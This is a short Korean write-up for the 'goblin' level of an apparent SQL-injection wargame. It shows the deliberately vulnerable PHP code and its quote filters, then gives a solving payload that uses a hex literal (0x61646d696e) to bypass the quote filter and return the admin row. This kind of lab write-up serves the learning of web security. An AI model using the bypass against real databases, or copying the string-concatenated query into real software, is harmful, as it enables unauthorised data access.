# goblin

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- GET 방식으로 no를 받는다.
- ' " \` 필터링 한다.
- 쿼리를 보면, id가 'guest'로 고정되어있다.
- 결과적으로 받아온 id가 'admin'이어야 한다.

## 3. Solution
변수명 | 값
---|---:
`no` | 1234 or id = 0x61646d696e


드디어 따옴표를 필터링 한다.<br>
&rarr; 'admin'과 같은 문자열 전달은 hex값으로 우회하면 된다.


해당 값을 보내면, query 속 조건은 다음과 같다.


**select id from prob_goblin where id='guest' and no=1234 or id = 0x61646d696e**


'guest'의 `no`를 모르기에, 아닌거 같은 값`1234`를 넣어준다.<br>
이후, 참이될 조건을 위해 id='admin'을 보내준다. 우회방법은 위와 같다.